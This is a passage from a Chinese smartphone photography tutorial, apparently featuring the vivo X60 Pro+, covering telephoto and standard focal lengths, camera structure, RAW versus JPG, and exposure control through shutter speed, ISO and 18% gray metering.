是包含在这个区间以内的。所以在之前我们提到的超广角所具有的特征，广角镜头一定会具备，只不过是「症状更轻」。</p>\n<p>比如画面的边缘拉伸，画面的中央挤压特性等等。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-b8fefabe562a3f2c200ecbfecd7fcd87_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic4.zhimg.com/v2-b8fefabe562a3f2c200ecbfecd7fcd87_r.jpg\"></figure><h3>长焦镜头（5X/等效焦距 125mm）</h3>\n<p>长焦镜头在摄影中的定义一般来说要在 85mm 及以上的焦距。大多数人对于长焦镜头的理解基本上只是局限在「拍得远」。的确，某种意义上来说长焦镜头甚至是望远镜的代名词。随着长焦数值的增加，我们可以看到的距离也就更远。</p>\n<p>但是拍得远，仅仅是长焦镜头的一个要素。对于长焦镜头，摄影师更加看重的是它相对于超广角镜头完全相反的一面。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-80cfe32641b1f4efbc68ae1de7e7fc12_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"3264\" class=\"origin_image zh-lightbox-thumb\" width=\"2448\" data-original=\"https://pic3.zhimg.com/v2-80cfe32641b1f4efbc68ae1de7e7fc12_r.jpg\"></figure><p>在前面我们知道超广角镜头拍摄的画面更广，画面中近大远小的效果更明显。那么长焦镜头其实则是完全相反的。对于长焦镜头来说：</p>\n<p>我们拍摄的范围会很窄，与此同时，拍摄的内容更远，并且画面不会再有特别夸张的透视效果。</p>\n<p><b>主动的减法</b></p>\n<p>如果说超广角镜头的难处是画面中包含了一切，需要摄影师主动安排和调整，那么长焦镜头则会相对主动一些。因为长焦镜头拍摄的很窄，所以大多数情况下使用长焦镜头，就会主动的减去画面中的不必要组成部分。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-0f7e842d3a4c313fb2529a73fcb2c1ec_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2059\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic1.zhimg.com/v2-0f7e842d3a4c313fb2529a73fcb2c1ec_r.jpg\"></figure><p>如果你是刚刚学习摄影，或者是对于构图不熟练的新手拍摄者，那么就可以多多尝试使用长焦镜头进行拍摄。比如上图，我们就可以一目了然的看到画面中的主体是月亮。拍摄时，完全不需要考虑地面或者是其它景物。</p>\n<p><b>透视与层次</b></p>\n<p>我自己是非常喜欢使用长焦镜头进行拍摄的。尤其是在一些风景作品中，我甚至是爱长焦超过超广角。因为如果说超广角镜头的特点是可以让空间中的远近关系明确的话，那么长焦镜头则完全相反。它一个很重要的特性就是「压缩空间」，让画面中的远近关系模糊掉。</p>\n<p>比如下面这张图，我们可以看到画面中的景物远近关系并不明显，好像每一个部分都是「被压瘪了一样」。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-d02e160f4e9a367c32b75f9ebb1d76c4_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic1.zhimg.com/v2-d02e160f4e9a367c32b75f9ebb1d76c4_r.jpg\"></figure><p>这样的视觉效果最大的一个好处就是可以给我们的画面带来非常明显的层次，而这种层次也就是照片中韵律和节奏的来源之一。我这样说可能有一点抽象，我还是使用一张图作为案例。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-90fe68fcbda8b12098255aa74ed57cd2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3210\" data-rawheight=\"1986\" class=\"origin_image zh-lightbox-thumb\" width=\"3210\" data-original=\"https://pic3.zhimg.com/v2-90fe68fcbda8b12098255aa74ed57cd2_r.jpg\"></figure><p>这张图是我在新疆拍摄的，当时太阳正在落上，光线正在远处的山间移动。由于使用了 vivo X60 Pro+ 长焦镜头拍摄，125mm 的焦距让整个草原景色有着非常清晰的线条。而这些线条就像是人类的骨骼，给整幅画面以筋骨。而我所说的韵律正是这些隐藏在长焦照片风景中的线。</p>\n<p>比如我换另一张照片，如下图，我们依然可以在画面中寻找到类似的线条。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-0fc4b0cbe9e518bbc0263c4901c13a67_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"3264\" class=\"origin_image zh-lightbox-thumb\" width=\"2448\" data-original=\"https://pic4.zhimg.com/v2-0fc4b0cbe9e518bbc0263c4901c13a67_r.jpg\"></figure><p>所以我自己来判断一张长焦风光照是不是美，某种意义上就是在看画面中的「线条美不美」。而我所说的韵律和节奏正是这些曲线流动的方式。</p>\n<p>这些优美的线条会把画面分割为不同的部分，这种风格可能很复杂也可能很简单。比如下面这张图中，我们只会看到一条线。而正是这条线把地面和天空简单地分开。这张图看似简单，但实际上当你使用非长焦镜头时却无法获得。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-c0c0fd74dbeb384a13c40bf8cd82827a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"3264\" class=\"origin_image zh-lightbox-thumb\" width=\"2448\" data-original=\"https://pic3.zhimg.com/v2-c0c0fd74dbeb384a13c40bf8cd82827a_r.jpg\"></figure><p>可能这就是我喜欢长焦镜头的原因，它非常优雅。你需要寻找画面中流动的线条，并且尝试用这些线条为画面分离出层次。</p>\n<p>由于本篇文章并不涉及后期，但是既然已经提到了韵律和节奏。正好就在这里趁热打铁，来分享一个后期思路。还是刚才的照片，这是它后期前后的对比：</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-c4235b33619a64d15c2decd1dc69e19b_b.jpg\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic4.zhimg.com/v2-c4235b33619a64d15c2decd1dc69e19b_r.jpg\"><figcaption>修图前</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-90fe68fcbda8b12098255aa74ed57cd2_b.jpg\" data-size=\"normal\" data-rawwidth=\"3210\" data-rawheight=\"1986\" class=\"origin_image zh-lightbox-thumb\" width=\"3210\" data-original=\"https://pic3.zhimg.com/v2-90fe68fcbda8b12098255aa74ed57cd2_r.jpg\"><figcaption>修图后</figcaption></figure><p>仔细观察发现，这张照片除了去除一些杂物以外，还有一个很重要的不同，这就是后者显然更加凸显画面中原有的线条和光线。</p>\n<p>这种「凸显」，就是著名的风光摄影师亚当斯所说的那句，摄影中：</p>\n<blockquote>前期拍摄就是谱曲，而后期就是演奏。</blockquote>\n<p>我在后期时，会先看整个照片的韵律到底在哪里。比如我看到画面中的各种线条非常优美，那我就强化这种优美。而方式也非常简单，让画面中线条分割的两部分对比更加明显。亮的更加亮，暗的更加暗。这种后期方式其实无处不在，几乎很多风光摄影大片都是如此。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-d1615dd73dd8bb5355f3847dd2ac91a8_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"3264\" class=\"origin_image zh-lightbox-thumb\" width=\"2448\" data-original=\"https://pic1.zhimg.com/v2-d1615dd73dd8bb5355f3847dd2ac91a8_r.jpg\"></figure><p>当然了，后期的思路和理念很多，以后如果有机会再和大家分享，很可能又是四万字。</p>\n<p>不过，这也是前面审美章节的又一例证，如果你精通音乐，自然就能立刻感受到照片中的韵律。一个不算冷门的知识，风光大师安塞尔·亚当斯其实本身是一个钢琴家。</p>\n<p>所以摄影啊，最重要的一定是摄影以外的东西。</p>\n<p><b>避免晃动</b></p>\n<p>超长焦镜头是最近几年才出现在智能手机上的，归根到底是因为，长焦镜头需要的技术门槛实在是太高了。其实不仅仅是技术门槛，使用门槛也极高。因为对于长焦镜头来说，由于光学的物理特性，导致：</p>\n<p>「长焦镜头对于防抖要求极高」。</p>\n<p>相信很多使用长焦镜头的用户会发现，长焦镜头很容易「糊照片」。具体的原因，在后面的曝光章节中会详细阐述，但在这里你只要知道，使用长焦镜头时尽量要保证画面的稳定 。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-280ae77831648d8d1fc9f004cccb77bb_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic4.zhimg.com/v2-280ae77831648d8d1fc9f004cccb77bb_r.jpg\"></figure><p>需要强调的是，长焦镜头可不是越长越好。现在一些厂商为了「技术竞赛」，完全不顾用户的真实体验，一些超长焦，甚至是百倍变焦频出。他们对于长焦的理解的意义仅为「远」，那么看到这里你应该也知道这种远并不是长焦的奥义。过长的焦距很多时候也大大限制它的使用场景，比如焦距只要超过 150mm ，室内就完全无法使用，当然你实力雄厚，家里是几百平的大平层就当我没说。</p>\n<h3>标准镜头（2X/等效焦距 50mm）</h3>\n<p>如果要说在目前所有手机提供的镜头焦段中，哪一个适合拍摄人像，那么我一定会告诉你选择这颗 2X 的 50mm 镜头。我们前文所阐述的超广角、长焦恰好是镜头焦距的两个极端。那么 50mm 恰好是他们的中点。也就是说：</p>\n<p>「50mm 没有夸张的透视效果，也有一个不窄不宽的拍摄范围。」</p>\n<p>也正是因为这个原因，50mm 左右的镜头也会被摄影师们称之为「标准焦距」。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-9ce5ed3d560622257ab316fd2ffadb17_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic4.zhimg.com/v2-9ce5ed3d560622257ab316fd2ffadb17_r.jpg\"></figure><p>而它是手机上最适合拍摄人像的一个关键原因就在于一方面由于没有夸张的透视效果，可以保证人物主体不变形，另一方面这个焦距可以很好地兼顾环境和人物之间的关系。</p>\n<p>如果你正在使用这个焦距的镜头拍摄人物，此时如果向前走一步，就可以拍摄人物的大肖像特写。而这样的肖像特写会着重表现人物的表情和心理状态。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-0f4b4d9866d2d8e5ed04a82769d0f3eb_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic4.zhimg.com/v2-0f4b4d9866d2d8e5ed04a82769d0f3eb_r.jpg\"></figure><p>而如果你退一步，就可以拍摄人物的环境肖像。环境肖像具有更强的叙述性，可以让我们看清画面中的因果关系，更加注重的是人物的动作。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-1dd8f523c4561361de31bc456542ec2f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic4.zhimg.com/v2-1dd8f523c4561361de31bc456542ec2f_r.jpg\"></figure><p>这里可以给所有苦恼给女朋友拍照片的男孩子们敲一下黑板上的重点，使用标准镜头拍摄姑娘成功率更高，更难出现一些意外状况。也算做是一个重要的「保命技能」吧。</p>\n<p>当然标准焦距除了人像以外，静物尤其是美食静物也是很好的选择。标准焦距既不会让食物或者是杯具变形，也不需要你本身离食物过远，不方便摆盘或者是调整。既然说到美食，就分享一个生活中最常见的一个小技巧。大家平时出去打卡餐厅可能会需要俯拍食物，但是使用 1X 23mm 焦距时很容易出现自己手的阴影，那么如果我们使用 2X 50mm 标准焦距就可以很大程度上避免这样的问题。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-898ceae8d9f7fac1b7c7c48b054f8b89_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic2.zhimg.com/v2-898ceae8d9f7fac1b7c7c48b054f8b89_r.jpg\"></figure><p>以上，就是四颗不同镜头的一些简单总结。但是需要说明的是，这只是常规意义上的经验，虽然打破常规这句话你可能听过很多次了，但其实本章节所阐述的「摄影眼」，最终的意义就是，寻找非寻常视角。</p>\n<p>归根到底，所谓的摄影眼，就是我们看待世界的方式。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-0c679c4ac0ebb247f82f9dd5e23708f5_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"3120\" class=\"origin_image zh-lightbox-thumb\" width=\"4160\" data-original=\"https://pic2.zhimg.com/v2-0c679c4ac0ebb247f82f9dd5e23708f5_r.jpg\"></figure><p>从技术来说，一个会拍照的摄影师，眼睛是会「自动变焦」的。当它走进一个场景，它的眼睛就会直接自动出现不同焦距的镜头在此场景中的效果。当然你也可以采用最笨的方式，直接更换不同焦距的镜头尝试取景。尤其是今天手机镜头的出现，更换镜头只需要通过点按画面中的按钮。而在以前，可是需要摄影师不断手动更换镜头才行。</p>\n<p>本章节的题目叫做镜头中的摄影眼，这句话的更想强调的是不同镜头带给我们的视野感受。但决定一张照片最终视野的并不是「镜头的焦距」，而是我们「内心的眼睛」。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-5611833503d52d53dcd509fc8d2721af_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3120\" data-rawheight=\"4160\" class=\"origin_image zh-lightbox-thumb\" width=\"3120\" data-original=\"https://pic4.zhimg.com/v2-5611833503d52d53dcd509fc8d2721af_r.jpg\"></figure><p>这就是我前面没有说完的，「如果你拍得不够好，是因为你拍得不够近」中，主观的近。尤其是我们想要为我们的照片注入情感，我们就需要用心去靠近。</p>\n<p>见天地者，即使长焦镜头也能展辽阔。</p>\n<p>见微小者，即使广角镜头也能嗅蔷薇。</p>\n<h2>04. 明与暗</h2>\n<p>在开始这一章节之前，我们需要做一件事，这就是了解相机的结构。不过别担心，我保证讲解的相机结构是阅读这篇文章的每一个人都可以读懂。</p>\n<h3>光的捕捉</h3>\n<p>今天的市场上，相机的种类可以说是五花八门。你打开各种交易网站，各类相机琳琅满目。就不说各种非常细致的分类了，就说价格区间也是相当的大。从几十块到几十万，想买多贵的都有。但是即使如此，几十万块的相机和几十块的相机基本原理都完全相同。</p>\n<p>就算是相机和手机，两种摄影的原理也相同。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-1ad1d11c4b492bfa50b7611368a158e0_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic1.zhimg.com/v2-1ad1d11c4b492bfa50b7611368a158e0_r.jpg\"></figure><p>这是因为摄影的本质来自于一个我们都学过的物理知识：</p>\n<p>「小孔成像」。</p>\n<p>是的，所有相机拍摄的画面，都是透过一个小孔，把画面映射到一个记录光线的载体中，而为了保证映射的画面不被干扰，所以所有的这一切都被放置到一个不透光的盒子中发生。</p>\n<p>当然这样说比较抽象，所以我准备了一个非常简单的动图：</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-c647bbd08e4be5b840b5dd9ce9931a99_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"639\" data-rawheight=\"451\" data-thumbnail=\"https://pic2.zhimg.com/v2-c647bbd08e4be5b840b5dd9ce9931a99_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"639\" data-original=\"https://pic2.zhimg.com/v2-c647bbd08e4be5b840b5dd9ce9931a99_r.jpg\"></figure><p>在这个图中我们可以看到，所谓透光的小孔就是镜头，而密封的盒子就是机身，而对于手机来说，我们所谓的 CMOS 传感器就是记录光线的载体。</p>\n<p>其实这个记录光线的载体材质是有演变的，在摄影诞生初期甚至是各种金属板。当然最著名的两个就是胶片和今天的光学传感器。他们的目的无非就是把光线记录下来。因为今天我们的手机都是使用数码光学传感器，所以这篇文章里就只谈谈数码曝光流程。</p>\n<p>在开始之前，要说明的是，这里可不是跟摄影无关的理论知识。这里的描述对于你理解曝光有着至关重要的作用，它是一种基础。所以，这一部分千万不要跳过阅读。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-d19375fadc37ec544ebb09132ca69dfc_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"3264\" class=\"origin_image zh-lightbox-thumb\" width=\"2448\" data-original=\"https://pic1.zhimg.com/v2-d19375fadc37ec544ebb09132ca69dfc_r.jpg\"></figure><p>所以当我们拍摄一张照片时，相机都在做什么呢？</p>\n<p>当我们按下快门的那一刻，光线透过小孔进入密封的机身，然后传感器通电，此时光信号转换为电信号，电信号再被传感器记录下来。但此时记录下来的信号，仅仅是单纯的「数字」。而这些记录下来的数字，我们叫做「Raw」文件。</p>\n<p>这个词，你可能第一次听说。但是你打开 vivo X60 Pro+ ，在专业模式里，就有一个开关按钮，打开以后，你就可以记录 Raw ，也就是这些原始的画面数据。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-1bcdf71bf3d5874863d953f1813bc77f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"888\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-1bcdf71bf3d5874863d953f1813bc77f_r.jpg\"></figure><p>但 Raw 格式，还不是我们所说的画面。我们想要真正的看到画面，我们的相机需要对这些数字进行翻译。也就是 Raw 格式变为我们常见的 JPG 以后，才是我们熟知的照片。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-ce2ab2a8d39581804ed283dc1d180032_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic3.zhimg.com/v2-ce2ab2a8d39581804ed283dc1d180032_r.jpg\"></figure><p>但是这种「翻译」有两个问题：</p>\n<ol>\n<li>翻译是有风格的，这也是为什么同样拍摄一个场景，大家的照片色彩风格不同。比如本篇文章的 vivo X 系列手机有着很强烈的类似徕卡的油画色调。而有风格，就会有喜爱。比如我自己就很反对一些品牌过度的颜色饱和。</li>\n<li>翻译是有损失的，因为 JPG 的结果是 Raw 格式的「取舍」。所以只要是 JPG 就意味信息丢失了。</li>\n</ol>\n<p>不过 Raw 格式的问题也是显而易见，它的存储量很大，一张就要几十M，而且它必须要后期，不然你甚至无法分享社交网络。</p>\n<p>所以这里的建议是，大多数情况用 JPG 够了，如果你真的喜欢后期，想要后期宽容度高，那么就使用 Raw。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-4698d5f34ccee5d2d0f8b05b25c60d0d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3060\" data-rawheight=\"4080\" class=\"origin_image zh-lightbox-thumb\" width=\"3060\" data-original=\"https://pic2.zhimg.com/v2-4698d5f34ccee5d2d0f8b05b25c60d0d_r.jpg\"></figure><h3>光的控制</h3>\n<p>说回正题，曝光。</p>\n<p>拍完一张照片，摄影师经常会给找一个评价，比如曝光太过了，或者是曝光不够。而这里的曝光不够，或者是曝光太过了，就是在说：</p>\n<p><b>进入相机的光线是否适量。</b></p>\n<p>所以我们要弄清楚第一个问题：</p>\n<p><b>相机是如何控制进入光线的量？</b></p>\n<p>我们回顾刚才的相机原理，传感器在记录光线是需要通电的。那么可想而知，通电时间越长，光线进入的总量也就会越多。</p>\n<p>而这个「通电时间」，就是我们所说的<b>「快门速度」。</b></p>\n<p>我们经常会在相机的参数里，看到一个「秒」，这个就是快门速度。比如下图中，快门速度就是 1/950S。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-502343fbba6b94448bd5b0f956295a6c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic1.zhimg.com/v2-502343fbba6b94448bd5b0f956295a6c_r.jpg\"></figure><p>那么显然，快门速度越长，进入的光线就会越多，那么我们拍摄的画面结果就会越亮。</p>\n<p>快门速度的跨度其实是非常大的，它可以是一瞬间，比如 1/2000S，它也可以是一段时间，比如 30S。他们之间相差有 60 万倍。那显然他们拍摄的画面效果是完全不同的。</p>\n<p>下图的快门速度是 1/5000S ，我们发现画面中所有人物的动作都被凝固了起来。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-ebb8d26db9ccbc155ec07f6f16603cb9_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3834\" data-rawheight=\"2876\" class=\"origin_image zh-lightbox-thumb\" width=\"3834\" data-original=\"https://pic2.zhimg.com/v2-ebb8d26db9ccbc155ec07f6f16603cb9_r.jpg\"></figure><p>而下图的快门速度是 0.7S ，我们会发现画面中的景物，尤其是光线会形成一种轨迹。这其实就是我们常规所说的光绘摄影，或者说慢门长曝光摄影。不过，想要拍摄这样的画面，有一个非常重要的前提，这就是需要拍摄时保持画面的稳定。只要画面晃动，就会造成画面模糊。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-d2fe81044678809103fc539190ef6c69_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4000\" data-rawheight=\"3000\" class=\"origin_image zh-lightbox-thumb\" width=\"4000\" data-original=\"https://pic2.zhimg.com/v2-d2fe81044678809103fc539190ef6c69_r.jpg\"></figure><p>这就是为什么星空摄影，光绘摄影都需要三脚架的配合。</p>\n<p>当然，影响画面明暗的不仅仅是快门速度一个参数。我们继续回到刚才的相机原理，我们知道光线最终是被「传感器」 记录的。那么显然这个传感器对于光线的感知能力，也影响着画面的明暗。</p>\n<p>同样时间进来的光线，如果这个传感器对于光线的感知能力强，那么显然画面就会亮，而如果这个传感器对于光线的感知能力不强。那么显然画面就会暗。而这个描述出传感器感光能力的数值，就是感光度。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-53a9bd913674019797063ab17284b15f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-53a9bd913674019797063ab17284b15f_r.jpg\"></figure><p>在胶片摄影时代，胶卷的感光度是固定的，比如 ISO 800、ISO 160 等。但是今天的数字传感器，感光值是一个可以变化的范围。</p>\n<p>vivo X60 Pro+ 的感光值范围是 50-3200。</p>\n<p>可想而知，感光值越高，画面越亮，感光值越低，画面越暗。</p>\n<p>这么一听，你可能会很兴奋，那是不是说只要我们无限控制感光度，我们就可以任何光线都能拍照。可事实我们发现我们并没有随心所欲。这是因为，今天的传感器有一个特性：</p>\n<p><b>随着感光值的提升，照片的画质会极速下降。</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-e265ec0b01ff2fe5c9ad60efaf2517f6_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic3.zhimg.com/v2-e265ec0b01ff2fe5c9ad60efaf2517f6_r.jpg\"></figure><figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-b9423bd9b15d269f3089d21332454b3f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic4.zhimg.com/v2-b9423bd9b15d269f3089d21332454b3f_r.jpg\"></figure><figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-6003bd2cd3f915728b4db947bad084dc_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic1.zhimg.com/v2-6003bd2cd3f915728b4db947bad084dc_r.jpg\"></figure><p>所以，调高感光值是有一个限度范围。而这个范围远没有大家想的高，对于手机来说，我认为 1600 已经算作是上限了。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-05b0962f3508728487a5795617eb57b8_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic1.zhimg.com/v2-05b0962f3508728487a5795617eb57b8_r.jpg\"></figure><p>好了，了解到这里，你已经知道如何控制画面的明暗了：</p>\n<ol>\n<li>快门速度</li>\n<li>感光值</li>\n</ol>\n<p>但其实如果你使用的是传统相机，还有一个很重要的参数，这就是光圈，但因为手机目前的光圈不可调节，所以为了减少学习压力，此处就按下不表。</p>\n<p>当然我知道读了这么多，其实你就学了两句话：</p>\n<p><b>快门速度越慢，画面越亮，快门速度越快，画面越暗。</b></p>\n<p><b>感光值越高，画面越亮，感光纸值越低，画面越暗。</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-08dd2a95833462b771950565b735c346_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic3.zhimg.com/v2-08dd2a95833462b771950565b735c346_r.jpg\"></figure><p>但是实际上，以上的原理过程才是真正对你创作有帮助的。如果我上来就告诉你结论，你会单纯的机械记忆。</p>\n<p>在以后的拍摄，或者是摄影学习中会遇到各种疑问。但是现在你从原理出发，这两句话只是顺其自然的结果。你就可以合理应用，比如现在你知道了：</p>\n<p><b>我想要画面中动态的效果，我就要延长快门速度。而此时画面过亮了，那我就降低一些感光值。</b></p>\n<p>当然你可能会说，这些参数我懂了，可是我在手机拍摄时，从来没有见过这这些参数。</p>\n<p>不，你见过。</p>\n<p>打开 vivo X60 Pro+ 的专业模式，我们就会看到 ISO 感光值 和 S 所代表的快门速度。点按两个参数进行调节，感受一下是不是和我前面描述的效果一致。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-78e198852ab5969cb21f0bd2ddad5c9a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2376\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"2376\" data-original=\"https://pic3.zhimg.com/v2-78e198852ab5969cb21f0bd2ddad5c9a_r.jpg\"></figure><h3>光的标尺</h3>\n<p>但对于曝光来说，学会控制曝光的工具才仅仅是第一步。</p>\n<p>而下一步，才是这一章节中最为重要的内容：</p>\n<p><b>到底什么样的曝光是合适的。</b></p>\n<p>但这里的合适，它是由两层含义的。一个是，客观上的合适，我愿意叫做为正确的曝光。另一个是，主观上的合适，我愿意叫做美的曝光。可能比较抽象，那我直接使用一张图举例你可能就会立刻了解了：</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-4139a6c6b332a80c091900a4deafca03_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1440\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-4139a6c6b332a80c091900a4deafca03_r.jpg\"></figure><figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-f5c053ad5912b13526f2e5938e736916_b.jpg\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1440\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic3.zhimg.com/v2-f5c053ad5912b13526f2e5938e736916_r.jpg\"><figcaption>同一场景下不同曝光</figcaption></figure><p>第一张图，画面整体明暗非常合适，整个画面都很细节丰富，层次丰满，显然这是正确的曝光。</p>\n<p>但是第二张图，画面整体非常偏暗，甚至是画面中很多都是死黑一片，显然这不是正确的曝光。</p>\n<p>可如果我问，哪两张图是美的，耐看的，我相信一定会有很多人会选择第二张。</p>\n<p>也就是说，正确的曝光并不等于美的曝光。</p>\n<p>但这不是说正确的曝光不重要，恰恰相反，我们要先从正确的曝光开始。</p>\n<p>今天我们的手机都是机器会自动曝光的，但是显然如果我们想要自动曝光，那么就要有一个所谓的参考。而这个所谓的参考并不是一个科学结论，而是一个通用准则，这就是：</p>\n<p><b>18% 的灰色。</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-5db0dd390abcd3245d6d513518b8166a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic3.zhimg.com/v2-5db0dd390abcd3245d6d513518b8166a_r.jpg\"></figure><p>手机在拍摄一张照片时，机器会主动的计算调整参数，让整个画面最后获得的拍摄亮度信息混合以后为 18% 灰。这就是我们所说的「正确的曝光」。</p>\n<p>当然，对于拍摄过程来说，我们并不需要知道这些，我们仅仅是需要知道，对于任何一个场景，我们都能计算出一个对应的曝光值。大多数情况下，这个曝光值都是准确的。那么获得这个信息以后，我们就会获得一个曝光调整的法则：</p>\n<p><b>快门速度（S）+ 感光值（ISO）= 